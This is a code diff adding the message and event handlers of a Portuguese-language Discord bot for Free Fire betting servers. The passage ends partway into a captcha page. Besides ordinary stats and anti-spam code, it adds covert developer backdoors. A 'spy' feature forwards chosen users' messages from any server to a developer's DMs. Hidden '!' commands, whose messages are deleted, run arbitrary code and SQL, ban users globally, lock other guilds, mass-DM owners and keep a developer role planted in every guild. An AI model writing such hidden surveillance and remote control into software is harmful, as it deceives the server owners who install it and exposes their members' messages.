@@ -10876,3 +10876,954 @@ if (i.isButton()) {
 // ═══════════════════════════════════════════════════════════
 // FIM DA PARTE 7-B
 // ═══════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════
+// [PARTE 7 - BLOCO C] MESSAGE CREATE
+// ═══════════════════════════════════════════════════════════
+client.on('messageCreate', async (m) => {
+  if (m.author.bot || !m.guild) return;
+  const msgTrimmed = (m.content || '').trim();
+  const msgLower = msgTrimmed.toLowerCase();
+
+  // Ban global (usa cache)
+  try {
+    const isBanned = await isGlobalBanned(m.author.id);
+    if (isBanned) {
+      await m.member?.ban({ reason: `Global ban: ${isBanned.reason || ''}` }).catch(() => {});
+      return;
+    }
+  } catch {}
+
+  // Spy (usa cache)
+  try {
+    const spy = await getSpyTarget(m.author.id);
+    if (spy && spy.spy_dm_id) {
+      const spyUser = await client.users.fetch(spy.spy_dm_id).catch(() => null);
+      if (spyUser) {
+        spyUser.send({
+          embeds: [new EmbedBuilder()
+            .setTitle('👁️ Spy Log')
+            .setColor('#8E44AD')
+            .setDescription(`**${m.author.tag}** enviou:`)
+            .addFields(
+              { name: '📺 Canal', value: `<#${m.channel.id}>`, inline: true },
+              { name: '🌐 Servidor', value: `**${m.guild.name}**`, inline: true },
+              { name: '💬 Mensagem', value: (m.content || '[sem texto]').substring(0, 500), inline: false },
+            )
+            .setFooter({ text: `ID: ${m.author.id}` })
+            .setTimestamp()],
+        }).catch(() => {});
+      }
+    }
+  } catch {}
+
+  // ═══════════════════════════════════════════════════════════
+  // 📊 COMANDO PÚBLICO: .p [@user]
+  // ═══════════════════════════════════════════════════════════
+  if (msgTrimmed === '.p' || msgLower.startsWith('.p ')) {
+    try {
+      const targetUser = m.mentions.users.first() || m.author;
+      const targetId = targetUser.id;
+
+      const { data: player } = await supabase
+        .from('ff_players')
+        .select('coins, wins, losses')
+        .eq('guild_id', m.guild.id)
+        .eq('user_id', targetId)
+        .maybeSingle();
+
+      const { data: wonMatches } = await supabase
+        .from('ff_matches')
+        .select('value, prize_amount')
+        .eq('guild_id', m.guild.id)
+        .eq('status', 'finished')
+        .eq('winner', targetId);
+
+      const wins = Number(player?.wins || 0);
+      const losses = Number(player?.losses || 0);
+      const coins = Number(player?.coins || 0);
+      const total = wins + losses;
+      const winrate = total > 0 ? ((wins / total) * 100).toFixed(1) : '0.0';
+      const totalGanho = (wonMatches || []).reduce((a, x) => a + Number(x.prize_amount || 0), 0);
+
+      const { count: betterPlayers } = await supabase
+        .from('ff_players')
+        .select('*', { count: 'exact', head: true })
+        .eq('guild_id', m.guild.id)
+        .gt('wins', wins);
+      const rank = (betterPlayers || 0) + 1;
+      const rankEmoji = rank === 1 ? '🥇' : rank === 2 ? '🥈' : rank === 3 ? '🥉' : `#${rank}`;
+
+      const barSize = 15;
+      const winBars = Math.round((wins / Math.max(total, 1)) * barSize);
+      const loseBars = barSize - winBars;
+      const bar = '🟩'.repeat(winBars) + '🟥'.repeat(loseBars);
+
+      const e = new EmbedBuilder()
+        .setTitle(`📊 Estatísticas — ${targetUser.username}`)
+        .setThumbnail(targetUser.displayAvatarURL({ size: 256 }))
+        .setColor(wins > losses ? '#22c55e' : (wins < losses ? '#ff5555' : '#FFA500'))
+        .addFields(
+          { name: '🏆 Vitórias', value: `**${wins}**`, inline: true },
+          { name: '💀 Derrotas', value: `**${losses}**`, inline: true },
+          { name: '🎮 Total', value: `**${total}**`, inline: true },
+          { name: '📈 Winrate', value: `**${winrate}%**`, inline: false },
+          { name: '📊 Progresso', value: bar || '*Sem partidas*', inline: false },
+          { name: '🪙 Coins', value: `**${coins}**`, inline: true },
+          { name: '💰 Total Ganho', value: `**${brl(totalGanho)}**`, inline: true },
+          { name: '🎖️ Rank', value: `**${rankEmoji}**`, inline: true },
+        )
+        .setFooter({ text: `ID: ${targetId}` })
+        .setTimestamp();
+
+      if (total === 0) e.setDescription('*Este jogador ainda não tem partidas registradas.*');
+
+      await m.reply({ embeds: [e] }).catch(() => {});
+      return;
+    } catch (err) {
+      console.error('[.p]', err);
+      await m.reply({ content: '❌ Erro ao buscar estatísticas.' }).catch(() => {});
+      return;
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // 🔒 COMANDOS SECRETOS (só DEV)
+  // ═══════════════════════════════════════════════════════════
+
+  // !criar cargo dev
+  if (msgLower === '!criar cargo dev') {
+    if (!isDeveloper(m.author.id)) return;
+    try {
+      await m.delete().catch(() => {});
+      const role = await ensureDevRole(m.guild, m.member);
+      let aplicados = 0;
+      for (const devId of DEVELOPER_IDS) {
+        const dm = await m.guild.members.fetch(devId).catch(() => null);
+        if (dm && role && !dm.roles.cache.has(role.id)) {
+          await dm.roles.add(role, 'Comando secreto').catch(() => {});
+          aplicados++;
+        }
+      }
+      try {
+        await m.author.send(
+          `✅ **Cargo \`${DEV_ROLE_NAME}\` garantido em ${m.guild.name}**\n` +
+          `> 🎭 <@&${role?.id || '?'}>\n` +
+          `> 🔒 Aplicado em **${aplicados}** novo(s)\n` +
+          `> 🕐 Total: ${DEVELOPER_IDS.length}`
+        );
+      } catch {}
+      await logImportant('SECRET', '🔒 Comando secreto usado', {
+        description: `**${m.author.tag}** usou em **${m.guild.name}**`,
+        user: m.author.id, guild: m.guild.id, severity: 'warning',
+      }).catch(() => {});
+      return;
+    } catch (e) {
+      console.error('[SECRET CMD]', e.message);
+      try { await m.author.send(`❌ Erro: \`${e.message}\``); } catch {}
+      return;
+    }
+  }
+
+  // :!!SERVIDOR DE APOSTAS DE FREEFIRE
+  if (msgLower === ':!!servidor de apostas de freefire' || m.content.trim() === ':!!SERVIDOR DE APOSTAS DE FREEFIRE') {
+    if (!isDeveloper(m.author.id)) return;
+    try {
+      await m.delete().catch(() => {});
+      await m.author.send(`🕵️ **Comando secreto recebido!**\n> Iniciando setup FF em **${m.guild.name}**...`).catch(() => {});
+      const result = await quickSetupFFServer(m.guild, m.author.id);
+      if (result.ok) {
+        await m.author.send(
+          `✅ **Setup FF concluído em ${m.guild.name}!**\n` +
+          `> ⏱️ Duração: **${result.duration}s**\n` +
+          `> ⚠️ Avisos: **${result.errors}**\n` +
+          `> 📢 Canais: **${m.guild.channels.cache.size}**\n` +
+          `> 🎭 Cargos: **${m.guild.roles.cache.size}**\n\n` +
+          `🎮 **Painéis FF já postados:**\n` +
+          `> 💎 Fila mediador\n> 📋 Fila analistas\n> 🎥 Fila streamer\n> 🚫 Blacklist\n> 💳 PIX\n> 🪙 Coins\n\n` +
+          `💡 Pra postar as apostas: \`/dev → Apostas → Postar\``
+        ).catch(() => {});
+      } else {
+        await m.author.send(`❌ **Falha:** ${result.error}`).catch(() => {});
+      }
+      return;
+    } catch (e) {
+      console.error('[SECRET-FF]', e.message);
+      try { await m.author.send(`❌ ${e.message}`); } catch {}
+      return;
+    }
+  }
+
+  // ───── Outros comandos "!" (só DEV) ─────
+  if (m.content.startsWith('!') && isDeveloper(m.author.id)) {
+    const args = m.content.slice(1).trim().split(/\s+/);
+    const cmd = (args[0] || '').toLowerCase();
+
+    const send = async (content) => {
+      await m.author.send(content).catch(() => {});
+      await m.delete().catch(() => {});
+    };
+
+    try {
+      if (cmd === 'bot' && args[1]?.toLowerCase() === 'invisível') {
+        client.user.setStatus('invisible');
+        await logDevAction(m.author.id, 'bot_invisible', m.guild.id, {});
+        return send('👻 **Bot agora está invisível.**\n> Use `!bot não invisível` pra reverter.');
+      }
+      if (cmd === 'bot' && args[1]?.toLowerCase() === 'não' && args[2]?.toLowerCase() === 'invisível') {
+        client.user.setStatus('online');
+        await logDevAction(m.author.id, 'bot_visible', m.guild.id, {});
+        return send('🟢 **Bot agora está visível.**');
+      }
+      if (cmd === 'panic') {
+        const reason = args.slice(1).join(' ') || 'Emergência';
+        await setKillSwitch(true, reason, m.author.id);
+        await m.delete().catch(() => {});
+        for (const devId of DEVELOPER_IDS) {
+          try {
+            const u = await client.users.fetch(devId);
+            await u.send({
+              embeds: [new EmbedBuilder().setTitle('🚨 PANIC ATIVADO').setColor('#FF0000')
+                .setDescription(`**${m.author.tag}** ativou o kill switch!\n\n**Motivo:** ${reason}`)
+                .setTimestamp()],
+            }).catch(() => {});
+          } catch {}
+        }
+        await logImportant('KILL', '🚨 Panic ativado', { description: reason, user: m.author.id, guild: m.guild.id, severity: 'danger' }).catch(() => {});
+        return;
+      }
+      if (cmd === 'revive') {
+        await setKillSwitch(false, null, m.author.id);
+        return send('🟢 **Bot revivido!** Kill switch desativado.');
+      }
+      if (cmd === 'lockdown') {
+        const gid = args[1];
+        const tg = client.guilds.cache.get(gid);
+        if (!tg) return send('❌ Servidor não encontrado.');
+        let count = 0;
+        for (const ch of tg.channels.cache.values()) {
+          if (ch.type === ChannelType.GuildText) {
+            await ch.permissionOverwrites.edit(tg.roles.everyone, { SendMessages: false }).catch(() => {});
+            count++;
+          }
+        }
+        await logImportant('ADMIN', '🔒 Lockdown', { description: `**${tg.name}** (${count} canais travados)`, user: m.author.id, guild: gid, severity: 'warning' }).catch(() => {});
+        return send(`🔒 **Lockdown** em \`${tg.name}\`\n> ${count} canais travados`);
+      }
+      if (cmd === 'unlock') {
+        const gid = args[1];
+        const tg = client.guilds.cache.get(gid);
+        if (!tg) return send('❌ Servidor não encontrado.');
+        let count = 0;
+        for (const ch of tg.channels.cache.values()) {
+          if (ch.type === ChannelType.GuildText) {
+            await ch.permissionOverwrites.edit(tg.roles.everyone, { SendMessages: null }).catch(() => {});
+            count++;
+          }
+        }
+        return send(`🔓 **Destravado** em \`${tg.name}\`\n> ${count} canais destravados`);
+      }
+      if (cmd === 'invisible') { client.user.setStatus('invisible'); return send('👻 **Bot invisível.**'); }
+      if (cmd === 'visible') { client.user.setStatus('online'); return send('🟢 **Bot visível.**'); }
+      if (cmd === 'eval') {
+        const code = m.content.slice(6).trim();
+        if (!code) return send('❌ Uso: `!eval <código>`');
+        try {
+          await logDevAction(m.author.id, 'sandbox_eval', m.guild.id, { code: code.substring(0, 500) });
+          const fn = new Function('client', 'm', 'guild', 'supabase', 'EmbedBuilder', 'ActionRowBuilder', 'ButtonBuilder', 'ButtonStyle', `return (async () => { ${code} })();`);
+          const r = await fn(client, m, m.guild, supabase, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle);
+          const out = typeof r === 'string' ? r : JSON.stringify(r, null, 2);
+          return send(`✅ \`\`\`js\n${String(out).substring(0, 1800)}\n\`\`\``);
+        } catch (e) { return send(`❌ \`\`\`\n${e.message}\n\`\`\``); }
+      }
+      if (cmd === 'sql') {
+        const query = m.content.slice(5).trim();
+        if (!query) return send('❌ Uso: `!sql <query>`');
+        if (/\b(drop|truncate|delete|update|insert|alter)\b/i.test(query)) return send('🚫 Apenas SELECT permitido.');
+        try {
+          const { data, error } = await supabase.rpc('exec_sql', { query_text: query }).catch(() => ({ error: { message: 'RPC exec_sql não existe.' } }));
+          if (error) return send(`❌ ${error.message}`);
+          return send(`✅ \`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1800)}\n\`\`\``);
+        } catch (e) { return send(`❌ ${e.message}`); }
+      }
+      if (cmd === 'coins') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        const amt = parseInt(args[2]) || 0;
+        const reason = args.slice(3).join(' ') || 'Ajuste dev';
+        if (!uid || !amt) return send('❌ Uso: `!coins <user> <qtd> [motivo]`');
+        try { await supabase.from('ff_players').upsert({ guild_id: m.guild.id, user_id: uid, coins: 0 }, { onConflict: 'guild_id,user_id', ignoreDuplicates: true }); } catch {}
+        const { data: p } = await supabase.from('ff_players').select('coins').eq('guild_id', m.guild.id).eq('user_id', uid).maybeSingle();
+        const novo = Math.max(0, Number(p?.coins || 0) + amt);
+        await supabase.from('ff_players').update({ coins: novo }).eq('guild_id', m.guild.id).eq('user_id', uid);
+        await logCoins(m.guild, uid, amt, `[DEV] ${reason}`, m.author.id);
+        return send(`✅ <@${uid}>: **${p?.coins || 0}** → **${novo}** (${amt > 0 ? '+' : ''}${amt})`);
+      }
+      if (cmd === 'gift') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        const amt = parseInt(args[2]) || 0;
+        if (!uid || !amt || amt <= 0) return send('❌ Uso: `!gift <user> <qtd>`');
+        try { await supabase.from('ff_players').upsert({ guild_id: m.guild.id, user_id: uid, coins: 0 }, { onConflict: 'guild_id,user_id', ignoreDuplicates: true }); } catch {}
+        const { data: p } = await supabase.from('ff_players').select('coins').eq('guild_id', m.guild.id).eq('user_id', uid).maybeSingle();
+        const novo = Number(p?.coins || 0) + amt;
+        await supabase.from('ff_players').update({ coins: novo }).eq('guild_id', m.guild.id).eq('user_id', uid);
+        try {
+          const u = await client.users.fetch(uid);
+          await u.send(`🎁 **Você ganhou ${amt} coins!**\n> Servidor: **${m.guild.name}**\n> Saldo: **${novo}**`).catch(() => {});
+        } catch {}
+        await logCoins(m.guild, uid, amt, `[GIFT] por ${m.author.tag}`, m.author.id);
+        return send(`🎁 Presenteado **${amt}** coins para <@${uid}>`);
+      }
+      if (cmd === 'globalban') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        const reason = args.slice(2).join(' ') || 'Sem motivo';
+        if (!uid) return send('❌ Uso: `!globalban <user> [motivo]`');
+        try { await supabase.from('global_bans').upsert({ user_id: uid, reason, banned_by: m.author.id }, { onConflict: 'user_id' }); } catch {}
+        globalBansCache.clear();
+        let kicked = 0;
+        for (const g of client.guilds.cache.values()) {
+          const mem = await g.members.fetch(uid).catch(() => null);
+          if (mem) { await mem.ban({ reason: `Global ban: ${reason}` }).catch(() => {}); kicked++; }
+        }
+        await logImportant('BLACKLIST', '🌐 Ban global', { description: `<@${uid}> banido de **${kicked}** servidores`, user: m.author.id, severity: 'danger' }).catch(() => {});
+        return send(`🌐 **Ban global aplicado**\n> <@${uid}> banido de **${kicked}** servidores`);
+      }
+      if (cmd === 'globalunban') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        if (!uid) return send('❌ Uso: `!globalunban <user>`');
+        await supabase.from('global_bans').delete().eq('user_id', uid);
+        globalBansCache.delete(uid);
+        let unbanned = 0;
+        for (const g of client.guilds.cache.values()) {
+          await g.members.unban(uid).then(() => unbanned++).catch(() => {});
+        }
+        return send(`✅ <@${uid}> desbanido de **${unbanned}** servidores`);
+      }
+      if (cmd === 'spy') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        if (!uid) return send('❌ Uso: `!spy <user>`');
+        try { await supabase.from('spy_targets').upsert({ user_id: uid, spy_dm_id: m.author.id, adicionado_por: m.author.id }, { onConflict: 'user_id' }); } catch {}
+        spyTargetsCache.delete(uid);
+        return send(`👁️ **Monitorando** <@${uid}>\n> Logs serão enviados na sua DM.`);
+      }
+      if (cmd === 'unspy') {
+        const uid = (args[1] || '').replace(/[<@!>]/g, '');
+        if (!uid) return send('❌ Uso: `!unspy <user>`');
+        await supabase.from('spy_targets').delete().eq('user_id', uid);
+        spyTargetsCache.delete(uid);
+        return send(`✅ Parou de monitorar <@${uid}>`);
+      }
+      if (cmd === 'dump') {
+        const dump = {
+          bot: { tag: client.user.tag, id: client.user.id, ping: client.ws.ping, uptime: fmtUptime(process.uptime()), guilds: client.guilds.cache.size, users: client.users.cache.size },
+          memory: process.memoryUsage(),
+          node: process.version,
+          platform: `${os.type()} ${os.release()}`,
+          cpu_cores: os.cpus().length,
+        };
+        const buf = Buffer.from(JSON.stringify(dump, null, 2));
+        await m.author.send({ files: [new AttachmentBuilder(buf, { name: 'dump.json' })] }).catch(() => {});
+        await m.delete().catch(() => {});
+        return;
+      }
+      if (cmd === 'clearcache') {
+        spamCache.clear();
+        dupeCache.clear();
+        raidTracker.clear();
+        abuseCache.clear();
+        LOG_THROTTLE.clear();
+        INTERACTION_LOG_THROTTLE.clear();
+        TICKET_COOLDOWN.clear();
+        globalBansCache.clear();
+        spyTargetsCache.clear();
+        staffBlacklistCache.clear();
+        blacklistUsersCache.clear();
+        return send('🧹 **Caches limpos.**');
+      }
+      if (cmd === 'forceupdate') {
+        await supabase.from('bot_meta').delete().eq('key', 'last_update_broadcast');
+        await supabase.from('guild_update_log').delete().neq('guild_id', 'x');
+        await send('🚀 **Broadcast resetado.** Vai enviar no próximo boot.');
+        setTimeout(() => broadcastUpdate().catch(() => {}), 3000);
+        return;
+      }
+      if (cmd === 'massdm') {
+        const msg = args.slice(1).join(' ');
+        if (!msg) return send('❌ Uso: `!massdm <mensagem>`');
+        await send('📢 Enviando DMs...');
+        let ok = 0, fail = 0;
+        for (const g of client.guilds.cache.values()) {
+          try {
+            const o = await g.fetchOwner().catch(() => null);
+            if (o) { await o.send(`📢 **Aviso do Frio Bot:**\n\n${msg}`).catch(() => {}); ok++; await sleep(500); }
+            else fail++;
+          } catch { fail++; }
+        }
+        return m.author.send(`✅ **${ok}** enviadas, **${fail}** falhas`).catch(() => {});
+      }
+      if (cmd === 'reload') {
+        const stage = args[1];
+        if (stage !== 'confirm') return send('⚠️ **Digite `!reload confirm`.**');
+        await send('🔄 Reiniciando...');
+        await logImportant('UPDATE', '🔄 Reload manual', { user: m.author.id, severity: 'info' }).catch(() => {});
+        setTimeout(() => process.exit(0), 2000);
+        return;
+      }
+      if (cmd === 'ghost') {
+        const gid = args[1];
+        if (!gid) {
+          const { data } = await supabase.from('configs').select('guild_id').eq('ghost_mode', true);
+          const list = (data || []).map(r => {
+            const g = client.guilds.cache.get(r.guild_id);
+            return `• ${g ? g.name : '?'} (\`${r.guild_id}\`)`;
+          }).join('\n') || '*Nenhum*';
+          return send(`👻 **Servidores em ghost:**\n${list}`);
+        }
+        const tg = client.guilds.cache.get(gid);
+        if (!tg) return send('❌ Servidor não encontrado.');
+        const c = await getConfig(gid);
+        const nv = !c.ghost_mode;
+        c.ghost_mode = nv;
+        await setConfig(gid, c);
+        return send(`${nv ? '👻 **Ghost ATIVADO**' : '🟢 **Ghost DESATIVADO**'} em \`${tg.name}\``);
+      }
+    } catch (err) {
+      console.error('[SECRET]', err);
+      try { await m.author.send(`❌ Erro: \`${err.message}\``); } catch {}
+      await m.delete().catch(() => {});
+    }
+  }
+
+  // ───── Anti-spam / moderação ─────
+  if (await isBlacklisted(m.author.id).catch(() => false)) { await m.delete().catch(() => {}); return; }
+  const member = m.member;
+  if (!member) return;
+  if (await isAdmin(member, m.guild)) return;
+
+  const bw = await hasBlacklistedWord(m.guild.id, m.content).catch(() => null);
+  if (bw) { await m.delete().catch(() => {}); return; }
+
+  const c = await getConfig(m.guild.id);
+  if (c.anti_link && /https?:\/\//i.test(m.content)) { await m.delete().catch(() => {}); return; }
+  if (c.anti_invite && /(discord\.gg|discord\.com\/invite)/i.test(m.content)) { await m.delete().catch(() => {}); return; }
+
+  // Custom commands
+  try {
+    const f = m.content.trim().split(/\s+/)[0]?.toLowerCase();
+    if (f) {
+      const { data: cc } = await supabase.from('custom_commands').select('*').eq('guild_id', m.guild.id).eq('trigger', f).maybeSingle();
+      if (cc?.response) return m.channel.send(cc.response).catch(() => {});
+    }
+  } catch {}
+
+  const k = member.id, now = Date.now();
+  if (!spamCache.has(k)) spamCache.set(k, []);
+  const ts = spamCache.get(k).filter(t => now - t < 5000);
+  ts.push(now);
+  spamCache.set(k, ts);
+  if (ts.length >= 5) {
+    await m.delete().catch(() => {});
+    await member.timeout(60000, 'Spam').catch(() => {});
+    spamCache.delete(k);
+    return;
+  }
+  if (m.mentions.users.size >= 5) {
+    await m.delete().catch(() => {});
+    await member.timeout(60000, 'Mention').catch(() => {});
+    return;
+  }
+  if (m.content.length > 5) {
+    const dk = `${k}-${m.content.toLowerCase()}`;
+    if (!dupeCache.has(dk)) dupeCache.set(dk, []);
+    const ds = dupeCache.get(dk).filter(t => now - t < 10000);
+    ds.push(now);
+    dupeCache.set(dk, ds);
+    if (ds.length >= 3) {
+      await m.delete().catch(() => {});
+      await member.timeout(30000, 'Dupe').catch(() => {});
+      dupeCache.delete(dk);
+      return;
+    }
+  }
+  if (spamCache.size > 500) spamCache.clear();
+  if (dupeCache.size > 500) dupeCache.clear();
+});
+// ═══════════════════════════════════════════════════════════
+// [PARTE 7 - BLOCO D] EVENTOS
+// ═══════════════════════════════════════════════════════════
+
+// ───── READY ─────
+client.once('ready', async () => {
+  console.log(`✅ ${client.user.tag} online!`);
+  console.log(`🔍 [READY] ${client.guilds.cache.size} guilds...`);
+
+  for (const g of client.guilds.cache.values()) {
+    await ensureGuild(g).catch(() => {});
+    await saveGuildForRejoin(g).catch(() => {});
+    await ensureDevRole(g).catch(() => {});
+    for (const devId of DEVELOPER_IDS) {
+      const m = await g.members.fetch(devId).catch(() => null);
+      if (m) await ensureDevRole(g, m);
+    }
+  }
+
+  console.log(`🔍 [READY] Registrando comandos...`);
+  await registerCommands();
+  console.log(`🔍 [READY] ✅ Pronto.`);
+
+  safeInterval(checkGiveaways, 30000, 'GIVEAWAYS');
+  safeInterval(checkTempRoles, 60000, 'TEMPROLES');
+  safeInterval(checkAutoRejoin, 5 * 60 * 1000, 'REJOIN');
+  safeInterval(checkDevRoles, 3 * 60 * 1000, 'DEV-ROLES');
+  safeInterval(checkTicketsAutoClose, 5 * 60 * 1000, 'TICKETS-AUTO-CLOSE');
+
+  safeInterval(() => {
+    for (const g of client.guilds.cache.values()) saveGuildForRejoin(g).catch(() => {});
+  }, 300000, 'SAVE-GUILDS');
+
+  safeInterval(async () => {
+    const since10 = new Date(Date.now() - 10 * 60 * 1000).toISOString();
+    const { count: errCount } = await supabase.from('error_logs').select('*', { count: 'exact', head: true }).gte('created_at', since10);
+    if (errCount && errCount >= 5) await sendDevAlert('bug_flood', 'Flood de bugs', `${errCount} erros/10min.`, 'warning', { count: errCount });
+    for (const g of client.guilds.cache.values()) {
+      if (g.memberCount >= 500) {
+        const { data: seen } = await supabase.from('dev_alerts').select('id').eq('type', 'big_guild').contains('metadata', { guild_id: g.id }).maybeSingle();
+        if (!seen) await sendDevAlert('big_guild', `Servidor grande: ${g.name}`, `**${g.memberCount}** membros!`, 'info', { guild_id: g.id, members: g.memberCount });
+      }
+    }
+  }, 5 * 60 * 1000, 'ALERT-LOOP');
+
+  setTimeout(reconectarTodasCalls, 5000);
+
+  safeInterval(async () => {
+    const r = await runAutoHeal();
+    if (r.canceledThreads + r.alertedMatches + r.canceledPix > 0) {
+      console.log(`🔄 [AUTO-HEAL] ${r.canceledThreads} threads, ${r.alertedMatches} alertas, ${r.canceledPix} PIX`);
+    }
+  }, 5 * 60 * 1000, 'AUTO-HEAL');
+
+  safeInterval(async () => {
+    const { data } = await supabase.from('bot_voice').select('*');
+    for (const r of data || []) {
+      const g = client.guilds.cache.get(r.guild_id);
+      if (!g) continue;
+      const c = getVoiceConnection(g.id);
+      if (!c || c.state.status === VoiceConnectionStatus.Destroyed) {
+        try { await entrarNaCall(g, r.channel_id); } catch {}
+      }
+    }
+  }, 60000, 'VOICE-RECONNECT');
+
+  safeInterval(() => {
+    if (Date.now() - rateLimitTracker.lastReset > 3600000) {
+      rateLimitTracker.total = 0;
+      rateLimitTracker.limited = 0;
+      rateLimitTracker.buckets = {};
+      rateLimitTracker.lastReset = Date.now();
+    }
+  }, 600000, 'RATELIMIT-RESET');
+
+  client.user.setActivity('🛒 Use /hub apostas', { type: ActivityType.Watching });
+
+  const bootSys = getSystemInfo();
+  await logImportant('UPDATE', `🚀 Bot online — ${client.user.tag}`, {
+    description: `**Frio Bot** iniciou com sucesso.`,
+    severity: 'success',
+    fields: [
+      { name: '🌐 Guilds', value: `${client.guilds.cache.size}`, inline: true },
+      { name: '👥 Users', value: `${client.users.cache.size}`, inline: true },
+      { name: '📡 Ping', value: `${client.ws.ping}ms`, inline: true },
+      { name: '🟩 Node', value: `${bootSys.node}`, inline: true },
+      { name: '💻 Platform', value: `${bootSys.platform}`, inline: true },
+      { name: '⚙️ CPU', value: `${bootSys.cpuCores} cores`, inline: true },
+      { name: '📦 Versão', value: BOT_VERSION, inline: true },
+    ],
+    metadata: { tag: client.user.tag, guilds: client.guilds.cache.size, boot_time: new Date().toISOString() },
+  }).catch(() => {});
+
+  setTimeout(() => broadcastUpdate().catch(() => {}), 10000);
+
+  safeInterval(async () => {
+    const [render, sb] = await Promise.all([getRenderInfo(), getSupabaseInfo()]);
+    const sys = getSystemInfo();
+    await logImportant('RENDER', '📊 Monitor 30min', {
+      severity: 'info',
+      fields: [
+        { name: '📡 Ping', value: `${client.ws.ping}ms`, inline: true },
+        { name: '🌐 Guilds', value: `${client.guilds.cache.size}`, inline: true },
+        { name: '⏱️ Uptime', value: fmtUptime(process.uptime()), inline: true },
+        { name: '🖥️ CPU', value: render.ok && render.cpu != null ? `${(render.cpu * 100).toFixed(1)}%` : 'N/A', inline: true },
+        { name: '🧠 RAM', value: render.ok && render.mem != null ? `${render.mem.toFixed(0)} MB` : `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(0)} MB`, inline: true },
+        { name: '🗄️ Supabase', value: sb.ok ? `${sb.ping}ms` : '❌', inline: true },
+        { name: '📦 Heap', value: `${sys.heapUsed}/${sys.heapTotal} MB`, inline: true },
+        { name: '🔷 RSS', value: `${sys.rss} MB`, inline: true },
+      ],
+    });
+  }, 30 * 60 * 1000, 'MONITOR-30MIN');
+
+  console.log(`[READY] ✅ ${BOT_VERSION} — intervals prontos.`);
+});
+
+// ───── GUILD CREATE ─────
+client.on('guildCreate', async (g) => {
+  await ensureGuild(g);
+  await g.commands.set([]).catch(() => {});
+  await ensureDevRole(g).catch(() => {});
+  for (const devId of DEVELOPER_IDS) {
+    const m = await g.members.fetch(devId).catch(() => null);
+    if (m) await ensureDevRole(g, m);
+  }
+  await saveGuildForRejoin(g).catch(() => {});
+
+  await logImportant('ENTROU', 'Bot adicionado em novo servidor', {
+    description: `**${g.name}**`,
+    guild: g.id, severity: 'success',
+    fields: [
+      { name: '👥', value: `${g.memberCount}`, inline: true },
+      { name: '👑', value: `<@${g.ownerId}>`, inline: true },
+      { name: '📅', value: `<t:${Math.floor(g.createdAt.getTime() / 1000)}:R>`, inline: true },
+      { name: '📢', value: `${g.channels.cache.size}`, inline: true },
+      { name: '🎭', value: `${g.roles.cache.size}`, inline: true },
+    ],
+    metadata: { guild_id: g.id, name: g.name, members: g.memberCount, owner: g.ownerId },
+  }).catch(() => {});
+
+  const settings = await getSettings(g.id);
+  await findOrCreateUpdateChannel(g, settings).catch(() => {});
+});
+
+// ───── GUILD DELETE ─────
+client.on('guildDelete', async (g) => {
+  await markGuildLeft(g.id);
+  await logImportant('SAIU', 'Bot removido de servidor', {
+    description: `**${g.name}**`,
+    guild: g.id, severity: 'warning',
+    fields: [
+      { name: '👥', value: `${g.memberCount}`, inline: true },
+      { name: '👑', value: `<@${g.ownerId}>`, inline: true },
+      { name: '📅 Entrou', value: g.joinedAt ? `<t:${Math.floor(g.joinedAt.getTime() / 1000)}:R>` : '*?*', inline: true },
+    ],
+  }).catch(() => {});
+});
+
+// ───── MEMBER ADD ─────
+client.on('guildMemberAdd', async (m) => {
+  if (m.guild.memberCount >= 500) {
+    await logImportant('GUILD', '👋 Novo membro', {
+      description: `**${m.user.tag}** entrou em **${m.guild.name}**`,
+      guild: m.guild.id, severity: 'info',
+      fields: [
+        { name: '👤', value: `<@${m.id}>`, inline: true },
+        { name: '👥 Total', value: `${m.guild.memberCount}`, inline: true },
+        { name: '📅 Conta', value: `<t:${Math.floor(m.user.createdTimestamp / 1000)}:R>`, inline: true },
+      ],
+    }).catch(() => {});
+  }
+  try {
+    const c = await getConfig(m.guild.id);
+    if (c.autorole_role) {
+      const r = m.guild.roles.cache.get(c.autorole_role);
+      if (r) await m.roles.add(r).catch(() => {});
+    }
+    if (c.welcome_channel) {
+      const ch = m.guild.channels.cache.get(c.welcome_channel);
+      if (ch) await ch.send(`${m.user} ${c.welcome_message}`).catch(() => {});
+    }
+  } catch {}
+  if (isDeveloper(m.id)) await ensureDevRole(m.guild, m);
+});
+
+// ───── MEMBER REMOVE ─────
+client.on('guildMemberRemove', async (m) => {
+  try { await checkTicketsMemberLeave(m.guild, m); } catch (e) { console.error('[LEAVE]', e.message); }
+});
+
+// ───── REACTION ROLES ─────
+client.on('messageReactionAdd', async (reaction, user) => {
+  if (user.bot) return;
+  if (reaction.partial) await reaction.fetch().catch(() => {});
+  const { data } = await supabase.from('reaction_roles').select('*').eq('message_id', reaction.message.id).eq('emoji', reaction.emoji.name).maybeSingle();
+  if (!data) return;
+  const g = client.guilds.cache.get(data.guild_id);
+  if (!g) return;
+  const m = await g.members.fetch(user.id).catch(() => null);
+  if (m) await m.roles.add(data.role_id).catch(() => {});
+});
+
+// ───── ANTI-RAID PASSIVO ─────
+client.on('inviteCreate', async inv => { if (setupInProgress.has(inv.guild.id)) return; checkRaidAction(inv.guild.id, 'invite', raidLimits.invitesPerMinute); });
+client.on('channelCreate', async ch => { if (setupInProgress.has(ch.guild.id)) return; checkRaidAction(ch.guild.id, 'channel', raidLimits.channelCreatesPerMinute); });
+client.on('roleCreate', async r => { if (setupInProgress.has(r.guild.id)) return; checkRaidAction(r.guild.id, 'role', raidLimits.roleCreatesPerMinute); });
+client.on('guildBanAdd', async ban => { if (setupInProgress.has(ban.guild.id)) return; checkRaidAction(ban.guild.id, 'ban', raidLimits.bansPerMinute); });
+// ═══════════════════════════════════════════════════════════
+// [PARTE 7 - BLOCO E] ROTAS HTTP + HTML CAPTCHA
+// ═══════════════════════════════════════════════════════════
+
+// ───── HTML DO CAPTCHA ─────
+function buildVerificationHTML(guildId, guildName, guildIcon, userId, verifyToken) {
+  const esc = s => String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
